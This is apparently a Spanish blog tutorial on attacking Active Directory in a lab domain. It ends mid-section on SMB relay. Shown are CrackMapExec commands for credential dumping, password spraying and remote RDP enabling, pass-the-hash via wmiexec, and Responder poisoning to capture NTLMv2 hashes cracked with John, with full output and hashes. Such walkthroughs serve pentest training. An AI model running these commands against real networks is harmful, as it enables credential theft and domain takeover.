---
title: Pentesting Active Directory
date: 2023-08-29 9:00:00
categories: [Windows, Active Directory, Apuntes]
tags: [ad, active directory, windows, windows server, tutorial]    
author: Waidroc
---


![TITULO!](/assets/img/2023-09-01/ad_titulo.jpg)


Esta vez, vamos a explorar diversas estrategias, enfoques y metodologías más comunes y efectivas para llevar a cabo pruebas de penetración en entornos de Active Directory. ¡Comencemos!

# ¿Qué es Active Directory?

Active Directory (AD) es un servicio de directorio desarrollado por Microsoft que actúa como un sistema centralizado para `administrar y organizar recursos` en una red. Funciona como una base de datos `jerárquica` que almacena información sobre usuarios, grupos, dispositivos y recursos en una red, permitiendo un acceso y una administración eficiente de los recursos.

Su importancia a nivel empresarial radica en que proporciona una `estructura organizativa` para la gestión de usuarios y recursos de TI. Permite a las organizaciones establecer políticas de seguridad, asignar permisos y derechos de acceso, y gestionar de manera centralizada la autenticación y autorización en toda la red. Además, facilita la administración de sistemas, la implementación de políticas de grupo y la gestión de software a través de la red, lo que ahorra tiempo y recursos en entornos empresariales de cualquier tamaño.

# ¿Qué vamos a ver en este post?

⧫ Crackmapexec enumeration <br/>
⧫ SMB Relay <br/>
⧫ Pass The Hash <br/>
⧫ Consiguiendo información de los usuarios <br/>
⧫ LDAP Enumeration <br/>
⧫ Kerbrute <br/>
⧫ Kerberoasting <br/>
⧫ AS-REP Roast <br/>
⧫ Golden Ticket <br/>
⧫ Rubeus - Kerberoasting <br/>
⧫ Rubeus - AS-REP Roast <br/>
⧫ SCF Files <br/>
⧫ Bloodhound & neo4j <br/>

## CrackMapExec Enumeration

- - -

![CME!](/assets/img/2023-09-01/cme.png)

Esta es la herramienta más utilizada para el pentesting en Active Directory, ya que `enumera` los servicios más comunes. A pesar de esto, es bastante sencilla de usar. Veamos que podemos realizar con esta `navaja suiza`:

### SMB Enumeration

- - -

`SMB` es un protocolo utilizado por sistemas Windows para compartir archivos e impresoras, así como para otras funciones. Es una parte esencial de muchas redes y uno de los servicios más comunes que se ejecutan. Existen varias herramientas para enumerar SMB, como `smbclient` o `smbmap`. Pero crackmapexec es mi favorita por muchas razones. Hablemos de ellas:

#### Network information

- - -

Utilizar `crackmapexec` de la manera más sencilla puede proporcionarte información como el dominio del Controlador de Dominio (DC), la firma SMB (la cual comprobaremos en el SMB Relay) o el nombre del host.

```zsh
❯ cme smb 192.168.10.1/24
SMB         192.168.10.110   445    W1-PC        [*] Windows 10.0 Build 19041 x64 (name:W1-PC) (domain:waidroc.local) (signing:False) (SMBv1:False)
SMB         192.168.10.115   445    W2-PC  [*] Windows 10.0 Build 17763 x64 (name:W2-PC) (domain:waidroc.local) (signing:True) (SMBv1:False)
SMB         192.168.10.120   445    W3-PC        [*] Windows 10.0 Build 19041 x64 (name:W3-PC) (domain:waidroc.local) (signing:False) (SMBv1:False)
```

De esta forma, podríamos ver los hosts con Windows que están conectados a la red. Podemos ver que el Controlador de Dominio (192.168.10.115) tiene la firma SMB, pero eso no importa si los otros PCs conectados al Controlador de Dominio no tienen la misma firma.

#### Dumping SAM

- - -

Si sabemos las credenciales de uno de los usuarios del sistema, podemos dumpear el fichero `SAM`, el cual contiene las contraseñas en forma de hash (NTLM) de las cuentas de usuario locales.

```zsh
❯ cme smb 192.168.10.1/24 -u usuario -p 'Password2' --sam
SMB         192.168.10.115   445    W2-PC  [*] Windows 10.0 Build 17763 x64 (name:W2-PC) (domain:waidroc.local) (signing:True) (SMBv1:False)
SMB         192.168.10.110   445    W1-PC        [*] Windows 10.0 Build 19041 x64 (name:W1-PC) (domain:waidroc.local) (signing:False) (SMBv1:False)
SMB         192.168.10.115   445    W2-PC  [+] waidroc.local\usuario:Password2 
SMB         192.168.10.110   445    W1-PC        [+] waidroc.local\usuario:Password2 
SMB         192.168.10.120   445    W3-PC        [*] Windows 10.0 Build 19041 x64 (name:W3-PC) (domain:waidroc.local) (signing:False) (SMBv1:False)
SMB         192.168.10.120   445    W3-PC        [+] waidroc.local\usuario:Password2 (Pwn3d!)
SMB         192.168.10.120   445    W3-PC        [+] Dumping SAM hashes
SMB         192.168.10.120   445    W3-PC        Administrador:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.10.120   445    W3-PC        Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.10.120   445    W3-PC        DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.10.120   445    W3-PC        WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:7b75aeef3ea91facb4cd29e7da7832d9:::
SMB         192.168.10.120   445    W3-PC        Cordy:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
SMB         192.168.10.120   445    W3-PC        [+] Added 5 SAM hashes to the database
```
Aquí podemos observar que al saber la contraseña de `usuario`, podemos ver y dumpear el fichero SAM del host W3-PC, obteniendo los hashes de sus cuentas de usuario local. Ahora, si esas contraseñas son "flojas" y pueden obtenerse fácilmente con un ataque de fuerza bruta o de diccionario, nos podríamos hacer con el control total del sistema.

#### Share Enumeration

- - -

```zsh
❯ cme smb 192.168.10.1/24 -u cordy -p 'Password1' --shares
SMB         192.168.10.115   445    W2-PC  [*] Windows 10.0 Build 17763 x64 (name:W2-PC) (domain:waidroc.local) (signing:True) (SMBv1:False)
SMB         192.168.10.110   445    W1-PC        [*] Windows 10.0 Build 19041 x64 (name:W1-PC) (domain:waidroc.local) (signing:False) (SMBv1:False)
SMB         192.168.10.115   445    W2-PC  [+] waidroc.local\cordy:Password1 
SMB         192.168.10.110   445    W1-PC        [+] waidroc.local\cordy:Password1 
SMB         192.168.10.110   445    W1-PC        [+] Enumerated shares
SMB         192.168.10.110   445    W1-PC        Share           Permissions     Remark
SMB         192.168.10.110   445    W1-PC        -----           -----------     ------
SMB         192.168.10.110   445    W1-PC        ADMIN$                          Admin remota
SMB         192.168.10.110   445    W1-PC        C$                              Recurso predeterminado
SMB         192.168.10.110   445    W1-PC        IPC$            READ            IPC remota
SMB         192.168.10.120   445    W3-PC        [*] Windows 10.0 Build 19041 x64 (name:W3-PC) (domain:waidroc.local) (signing:False) (SMBv1:False)
SMB         192.168.10.115   445    W2-PC  [+] Enumerated shares
SMB         192.168.10.120   445    W3-PC        [+] waidroc.local\cordy:Password1 
SMB         192.168.10.115   445    W2-PC  Share           Permissions     Remark
SMB         192.168.10.115   445    W2-PC  -----           -----------     ------
SMB         192.168.10.115   445    W2-PC  ADMIN$                          Remote Admin
SMB         192.168.10.115   445    W2-PC  C$                              Default share
SMB         192.168.10.115   445    W2-PC  IPC$            READ            Remote IPC
SMB         192.168.10.115   445    W2-PC  NETLOGON        READ            Logon server share 
SMB         192.168.10.115   445    W2-PC  SYSVOL          READ            Logon server share 
SMB         192.168.10.120   445    W3-PC        [+] Enumerated shares
SMB         192.168.10.120   445    W3-PC        Share           Permissions     Remark
SMB         192.168.10.120   445    W3-PC        -----           -----------     ------
SMB         192.168.10.120   445    W3-PC        ADMIN$                          Admin remota
SMB         192.168.10.120   445    W3-PC        C$                              Recurso predeterminado
SMB         192.168.10.120   445    W3-PC        IPC$            READ            IPC remota
                                                                                                                                                                                                                                
❯ cme smb 192.168.0.1/24 -u usuario -p 'Password2' --shares
SMB         192.168.10.115   445    W2-PC  [*] Windows 10.0 Build 17763 x64 (name:W2-PC) (domain:waidroc.local) (signing:True) (SMBv1:False)
SMB         192.168.10.110   445    W1-PC        [*] Windows 10.0 Build 19041 x64 (name:W1-PC) (domain:waidroc.local) (signing:False) (SMBv1:False)
SMB         192.168.10.115   445    W2-PC  [+] waidroc.local\usuario:Password2 
SMB         192.168.10.110   445    W1-PC        [+] waidroc.local\usuario:Password2 
SMB         192.168.10.110   445    W1-PC        [+] Enumerated shares
SMB         192.168.10.110   445    W1-PC        Share           Permissions     Remark
SMB         192.168.10.110   445    W1-PC        -----           -----------     ------
SMB         192.168.10.110   445    W1-PC        ADMIN$                          Admin remota
SMB         192.168.10.110   445    W1-PC        C$                              Recurso predeterminado
SMB         192.168.10.110   445    W1-PC        IPC$            READ            IPC remota
SMB         192.168.10.120   445    W3-PC        [*] Windows 10.0 Build 19041 x64 (name:W3-PC) (domain:waidroc.local) (signing:False) (SMBv1:False)
SMB         192.168.10.115   445    W2-PC  [+] Enumerated shares
SMB         192.168.10.115   445    W2-PC  Share           Permissions     Remark
SMB         192.168.10.115   445    W2-PC  -----           -----------     ------
SMB         192.168.10.115   445    W2-PC  ADMIN$                          Remote Admin
SMB         192.168.10.115   445    W2-PC  C$                              Default share
SMB         192.168.10.115   445    W2-PC  IPC$            READ            Remote IPC
SMB         192.168.10.115   445    W2-PC  NETLOGON        READ            Logon server share 
SMB         192.168.10.115   445    W2-PC  SYSVOL          READ            Logon server share 
SMB         192.168.10.120   445    W3-PC        [+] waidroc.local\usuario:Password2 (Pwn3d!)
SMB         192.168.10.120   445    W3-PC        [+] Enumerated shares
SMB         192.168.10.120   445    W3-PC        Share           Permissions     Remark
SMB         192.168.10.120   445    W3-PC        -----           -----------     ------
SMB         192.168.10.120   445    W3-PC        ADMIN$          READ,WRITE      Admin remota
SMB         192.168.10.120   445    W3-PC        C$              READ,WRITE      Recurso predeterminado
SMB         192.168.10.120   445    W3-PC        IPC$            READ            IPC remota
```

De nuevo, podemos observar de nuevo que el usuario `usuario` tiene permisos de administrador sobre el usuario `cordy`. Esta salida nos muestra el tipo de permisos sobre los recursos compartidos (si los hay).

#### Spidering

- - -

Una de las opciones más importantes que nos brinda `cme` es un módulo llamado `spider_plus`, ya que explora todos los recursos compartidos y directorios que hay en su interior de manera recursiva, proporcionándonos así un resultado ordenado y muy visual, mostrándonos todos los ficheros visibles en cada recurso compartido. 

Este módulo nos agiliza y facilita la tarea, ya que no tenemos que acceder a cada uno de los recursos compartidos para enumerar todos los directoriso y ficheros que contienen manualmente. Veamos un ejemplo:

```zsh
❯ cme smb 192.168.0.1/24 -u usuario -p 'Password2' -M spider_plus
SMB         192.168.10.110   445    W1-PC        [*] Windows 10.0 Build 19041 x64 (name:W1-PC) (domain:waidroc.local) (signing:False) (SMBv1:False)
SMB         192.168.10.120   445    W3-PC        [*] Windows 10.0 Build 19041 x64 (name:W3-PC) (domain:waidroc.local) (signing:False) (SMBv1:False)
SMB         192.168.10.115   445    W2-PC  [*] Windows 10.0 Build 17763 x64 (name:W2-PC) (domain:waidroc.local) (signing:True) (SMBv1:False)
SMB         192.168.10.110   445    W1-PC        [+] waidroc.local\usuario:Password2 
SPIDER_P... 192.168.10.110   445    W1-PC        [*] Started spidering plus with option:
SPIDER_P... 192.168.10.110   445    W1-PC        [*]        DIR: ['print$']
SPIDER_P... 192.168.10.110   445    W1-PC        [*]        EXT: ['ico', 'lnk']
SPIDER_P... 192.168.10.110   445    W1-PC        [*]       SIZE: 51200
SPIDER_P... 192.168.10.110   445    W1-PC        [*]     OUTPUT: /tmp/cme_spider_plus
SMB         192.168.10.120   445    W3-PC        [+] waidroc.local\usuario:Password2 (Pwn3d!)
SPIDER_P... 192.168.10.120   445    W3-PC        [*] Started spidering plus with option:
SPIDER_P... 192.168.10.120   445    W3-PC        [*]        DIR: ['print$']
SPIDER_P... 192.168.10.120   445    W3-PC        [*]        EXT: ['ico', 'lnk']
SPIDER_P... 192.168.10.120   445    W3-PC        [*]       SIZE: 51200
SPIDER_P... 192.168.10.120   445    W3-PC        [*]     OUTPUT: /tmp/cme_spider_plus
SMB         192.168.10.115   445    W2-PC  [+] waidroc.local\usuario:Password2 
SPIDER_P... 192.168.10.115   445    W2-PC  [*] Started spidering plus with option:
SPIDER_P... 192.168.10.115   445    W2-PC  [*]        DIR: ['print$']
SPIDER_P... 192.168.10.115   445    W2-PC  [*]        EXT: ['ico', 'lnk']
SPIDER_P... 192.168.10.115   445    W2-PC  [*]       SIZE: 51200
SPIDER_P... 192.168.10.115   445    W2-PC  [*]     OUTPUT: /tmp/cme_spider_plus
```

#### Authentication Sprying

- - -

Ahora, imaginemos que tenemos la credencial del usuario `Administrator`, el cual es el administrador del dominio. Lo hemos obtenido con un ataque `SMB Relay`.
Pues, con `crackmapexec`, podríamos realizar un ataque de `password spraying` para ver en qué sistemas puedes conectarte. Veamos:

```zsh
❯ cme smb 192.168.0.1/24 -u Administrator -p 'P4$$W0rd!!!#'
SMB         192.168.10.110   445    W1-PC        [*] Windows 10.0 Build 19041 x64 (name:W1-PC) (domain:waidroc.local) (signing:False) (SMBv1:False)
SMB         192.168.10.115   445    W2-PC  [*] Windows 10.0 Build 17763 x64 (name:W2-PC) (domain:waidroc.local) (signing:True) (SMBv1:False)
SMB         192.168.10.110   445    W1-PC        [+] waidroc.local\Administrator:P4$$W0rd!!!# (Pwn3d!)
SMB         192.168.10.115   445    W2-PC  [+] waidroc.local\Administrator:P4$$W0rd!!!# (Pwn3d!)
SMB         192.168.10.120   445    W3-PC        [*] Windows 10.0 Build 19041 x64 (name:W3-PC) (domain:waidroc.local) (signing:False) (SMBv1:False)
SMB         192.168.10.120   445    W3-PC        [+] waidroc.local\Administrator:P4$$W0rd!!!# (Pwn3d!)
```

En este caso, al ser administradores del DC, nos podemos conectar a todos y cada uno de los hosts que hay en la red. Ahora, podríamos habilitar el protocolo `rdp` en todos los sistemas para podernos conectar a ellos vía `pth-winexe`:

```zsh
❯ cme smb 192.168.0.1/24 -u Administrator -p 'P4$$W0rd!!!#' -M rdp -o action=enable
SMB         192.168.10.110   445    W1-PC        [*] Windows 10.0 Build 19041 x64 (name:W1-PC) (domain:waidroc.local) (signing:False) (SMBv1:False)
SMB         192.168.10.120   445    W3-PC        [*] Windows 10.0 Build 19041 x64 (name:W3-PC) (domain:waidroc.local) (signing:False) (SMBv1:False)
SMB         192.168.10.115   445    W2-PC  [*] Windows 10.0 Build 17763 x64 (name:W2-PC) (domain:waidroc.local) (signing:True) (SMBv1:False)
SMB         192.168.10.110   445    W1-PC        [+] waidroc.local\Administrator:P4$$W0rd!!!# (Pwn3d!)
SMB         192.168.10.120   445    W3-PC        [+] waidroc.local\Administrator:P4$$W0rd!!!# (Pwn3d!)
SMB         192.168.10.115   445    W2-PC  [+] waidroc.local\Administrator:P4$$W0rd!!!# (Pwn3d!)
RDP         192.168.10.110   445    W1-PC        [+] RDP enabled successfully
RDP         192.168.10.120   445    W3-PC        [+] RDP enabled successfully
RDP         192.168.10.115   445    W2-PC  [+] RDP enabled successfully
```

## Pass The Hash

- - -

Ahora, podemos volcar el fichero `NTDS` y obtener el hash. Nuestra víctima será el usuario `usuario`:

```zsh
❯ cme smb 192.168.10.115 -u Administrator -p 'P4$$W0rd!!!#' --ntds vss
SMB         192.168.10.115   445    W2-PC  [*] Windows 10.0 Build 17763 x64 (name:W2-PC) (domain:waidroc.local) (signing:True) (SMBv1:False)
SMB         192.168.10.115   445    W2-PC  [+] waidroc.local\Administrator:P4$$W0rd!!!# (Pwn3d!)
SMB         192.168.10.115   445    W2-PC  [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         192.168.10.115   445    W2-PC  Administrator:500:aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33:::
SMB         192.168.10.115   445    W2-PC  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.10.115   445    W2-PC  W2-PC$:1000:aad3b435b51404eeaad3b435b51404ee:4054f61d8984e3d043fe140d9a78fea2:::
SMB         192.168.10.115   445    W2-PC  krbtgt:502:aad3b435b51404eeaad3b435b51404ee:acf2d0133c0db165efbca5b44072e10a:::
SMB         192.168.10.115   445    W2-PC  waidroc.local\cordy:1103:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
SMB         192.168.10.115   445    W2-PC  W3-PC$:1104:aad3b435b51404eeaad3b435b51404ee:ab1687ba2fe14303e8a2db5d154f7aa8:::
SMB         192.168.10.115   445    W2-PC  waidroc.local\usuario:1106:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0:::
SMB         192.168.10.115   445    W2-PC  W1-PC$:1107:aad3b435b51404eeaad3b435b51404ee:5b8bfc212d142cedbcd2edcb5937a38a:::
SMB         192.168.10.115   445    W2-PC  [+] Dumped 8 NTDS hashes to /root/.cme/logs/W2-PC_192.168.10.115_2023-05-25_164328.ntds of which 5 were added to the database
```

De esta forma, podemos obtener el hash del usuario víctima y conectarnos al host con `wmiexec`:

```zsh
❯ wmiexec.py waidroc.local/usuario@192.168.10.120 -hashes aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
waidroc\usuario
C:\>ipconfig
[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute wmiexec.py again with -codec and the corresponding codec

Configuraci�n IP de Windows


Adaptador de Ethernet Ethernet:

   Sufijo DNS espec�fico para la conexi�n. . : 
   V�nculo: direcci�n IPv6 local. . . : fe80::7024:cc60:3dde:1db6%8
   Direcci�n IPv4. . . . . . . . . . . . . . : 192.168.10.120
   M�scara de subred . . . . . . . . . . . . : 255.255.255.0
   Puerta de enlace predeterminada . . . . . : 192.168.10.1

```

De esta forma, estaremos ejecutando comandos como `usuario` en el host W3-PC, con privilegios de administrador.

## SMB Relay

- - -

![SMBR!](/assets/img/2023-09-01/smbrelay.png)

Este es el ataque más común y a su vez, el primero que debemos de ejecutar cuando estamos haciendo una auditoría al Controlador de Dominio.


### ¿Qué es un ataque SMB Relay?

Un ataque `SMB Relay` lo realizamos cuando nosotros, como atacantes, capturamos un hash NTLMv2 de algún usuario y así poder interceptar y redirigir solicitudes de autenticación SMB de un host a otro, aprovechando así las funcionalidades de confianza mutua en redes locales. 

Así, engañamos a una máquina víctima para que envíe sus credenciales de autenticación al atacante, en lugar de al servidor o recurso legítimo para así, poder utilizar posteriormente esas credenciales para acceder a sistemas o recursos a los que la víctima tenía acceso, consiguiendo una escalada de privilegios a nivel de red.

### Prerrequisitos

- `SMB` no firmado.
- Debe de realizarse en una red local.
- Las credenciales de usuario deben tener acceso de inicio de sesión remoto, por ejemplo, ser administrador local en la máquina objetivo o ser miembro del grupo de Administradores del Dominio.


### SMB Signing

- - -

#### ¿Qué hace?

- - -

La firma del SMB, verifica el `origen y la autenticidad` de los paquetes SMB. Efectivamente, esto cancela todo tipo de ataque `MITM`, como el ataque SMB relay desde su inicio. Si está activado no podremos realizar el ataque.

Podemos comprobar si este servicio esta activado con `cme`.

#### Prueba de Concepto (PoC)

- - -

```zsh
❯ cme smb 192.168.0.1/24
SMB         192.168.0.114   445    WIN-23Q9AFM8V9R  [*] Windows 10.0 Build 17763 x64 (name:WIN-23Q9AFM8V9R) (domain:test.local) (signing:True) (SMBv1:False)
SMB         192.168.10.115   445    W2-PC  [*] Windows 10.0 Build 17763 x64 (name:W2-PC) (domain:waidroc.local) (signing:True) (SMBv1:False)
SMB         192.168.10.120   445    W3-PC        [*] Windows 10.0 Build 19041 x64 (name:W3-PC) (domain:waidroc.local) (signing:False) (SMBv1:False)
```

Aquí podemos ver que tenemos `2 DCs`:

- `test.local` (192.168.0.114)
- `waidroc.local` (192.168.10.115)

En ambos casos, SMB no esta firmado, por consecuente, podríamos realizar el ataque sin problemas:

Primero, con la herramienta `responder`, envenenamos la red:

```zsh
❯ responder -I wlan0 -dw
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [ON]

[+] Servers:
    HTTP server                [OFF]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [OFF]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [wlan0]
    Responder IP               [192.168.10.105]
    Responder IPv6             [fe80::1726:b490:48e1:fe89]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-NDF5GOK02C8]
    Responder Domain Name      [97ZB.LOCAL]
    Responder DCE-RPC Port     [45364]

[+] Listening for events...

[*] [DHCP] Found DHCP server IP: 192.168.10.1, now waiting for incoming requests...
```
Ahora, si ingresaramos a un recurso que no existe en el Explorador de Archivos de Windows, tu responder autenticaría como el recurso inexistente:

Si accedemos a un recurso que no existe en el Explorador de Archivos de Windows, nuestro responder autenticaría como el recurso inexistente.

En la máquina Windows, parece que no habría pasado nada pero si echamos un vistazo en el `responder`:

```zsh
❯ responder -I wlan0 -dw
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [wlan0]
    Responder IP               [192.168.10.105]
    Responder IPv6             [fe80::1726:b490:48e1:fe89]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-WGLRX6KFSXA]
    Responder Domain Name      [72XV.LOCAL]
    Responder DCE-RPC Port     [46997]

[+] Listening for events...

[*] [DHCP] Found DHCP server IP: 192.168.10.1, now waiting for incoming requests...
[*] [MDNS] Poisoned answer sent to 192.168.10.114   for name thisisnotexisting.local
[*] [MDNS] Poisoned answer sent to fe80::43b2:5355:d026:2e2a for name thisisnotexisting.local
[*] [MDNS] Poisoned answer sent to 192.168.10.114   for name thisisnotexisting.local
[*] [MDNS] Poisoned answer sent to fe80::43b2:5355:d026:2e2a for name thisisnotexisting.local
[*] [LLMNR]  Poisoned answer sent to 192.168.10.114 for name thisisnotexisting
[*] [LLMNR]  Poisoned answer sent to fe80::43b2:5355:d026:2e2a for name thisisnotexisting
[*] [LLMNR]  Poisoned answer sent to fe80::43b2:5355:d026:2e2a for name thisisnotexisting
[*] [LLMNR]  Poisoned answer sent to 192.168.10.114 for name thisisnotexisting
[SMB] NTLMv2-SSP Client   : fe80::43b2:5355:d026:2e2a
[SMB] NTLMv2-SSP Username : TEST\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::TEST:3fabd80df2a798d1:5CFA7A9518D439D72DE93334446B0E78:01010000000000008096715AB98DD9019F2CE73B69622AA20000000002000800370032005800560001001E00570049004E002D00570047004C005200580036004B00460053005800410004003400570049004E002D00570047004C005200580036004B0046005300580041002E0037003200580056002E004C004F00430041004C000300140037003200580056002E004C004F00430041004C000500140037003200580056002E004C004F00430041004C00070008008096715AB98DD9010600040002000000080030003000000000000000000000000030000058EB90B87185FC51DDCBC7261E23DCE94E13E0B5FC10237908F6DD837C13582E0A0010000000000000000000000000000000000009002C0063006900660073002F007400680069007300690073006E006F0074006500780069007300740069006E0067000000000000000000
```

Hemos capturado el hash `NTLMv2` del usuario `Administrator`!! Ahora, podemos intentar crackear dicho hash pero, en este caso, no podríamos porque es una contraseña segura que tardaríamos años en desencriptar.

Ahora, hacemos el mismo proceso, pero hagámoslo en nuestro `entorno de pruebas`, donde capturaremos un hash menos seguro, fácilmente crackeable por `fuerza bruta`. Repetimos el proceso y observamos el `responder`:

```zsh
❯ responder -I wlan0 -v
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [wlan0]
    Responder IP               [192.168.10.105]
    Responder IPv6             [fe80::1726:b490:48e1:fe89]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-G98QVZWMZJ4]
    Responder Domain Name      [3R0S.LOCAL]
    Responder DCE-RPC Port     [48530]

[+] Listening for events...

[*] [MDNS] Poisoned answer sent to 192.168.10.115   for name waidrocagphqpwerug.local
[*] [MDNS] Poisoned answer sent to 192.168.10.115   for name waidrocagphqpwerug.local
[*] [LLMNR]  Poisoned answer sent to 192.168.10.115 for name waidrocagphqpwerug
[*] [LLMNR]  Poisoned answer sent to 192.168.10.115 for name waidrocagphqpwerug
[SMB] NTLMv2-SSP Client   : fe80::1e2e:ac4a:2102:569f
[SMB] NTLMv2-SSP Username : waidroc\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::waidroc:84cc9122d9316c48:9D34FF6B29164B3E2A9E9ADE37D10914:010100000000000080D0D28C598ED90141B5EB01668B658C0000000002000800330052003000530001001E00570049004E002D00470039003800510056005A0057004D005A004A00340004003400570049004E002D00470039003800510056005A0057004D005A004A0034002E0033005200300053002E004C004F00430041004C000300140033005200300053002E004C004F00430041004C000500140033005200300053002E004C004F00430041004C000700080080D0D28C598ED901060004000200000008003000300000000000000000000000003000003A4DD9718188490BDF219D7B66290306551A69F6C9A7CFF2C5832C8EAFB0C9040A001000000000000000000000000000000000000900300063006900660073002F0072007500790063007200340066007400610067007000680071007000770065007200750067000000000000000000
```

Podemos ver que `Administrator` se ha autenticado en el dominio `waidroc.local`. Guardemos el hash e intentémos crackearlo con la herramienta `john the ripper`!

```zsh
❯ john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
P4$$W0rd!!!#        (Administrator)     
1g 0:00:00:11 DONE (2023-05-24 16:07) 0.08547g/s 919849p/s 919849c/s 919849C/s PAK2530..P1nkr1ng
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```

Hemos crackeado la contraseña del usuario víctima -> `Administrator:P4$$W0rd!!!#`

#### Attack (IPv4)

- - -

> Para que funcione, debemos de realizar algunos cambios en el fichero de configuración de responder (/usr/share/responder/Responder.conf).
{: .prompt-info}

En algunos Controladores de Dominio, hay algunos usuarios que tienen privilegios en otros usuarios, como en este caso ya que, el usuario `usuario` es privilegiado sobre `cordy`:

```zsh
❯ cme smb 192.168.10.1/24 -u 'usuario' -p 'Password2'
SMB         192.168.0.109   445    SARA             [*] Windows 10.0 Build 19041 x64 (name:SARA) (domain:SARA) (signing:False) (SMBv1:False)
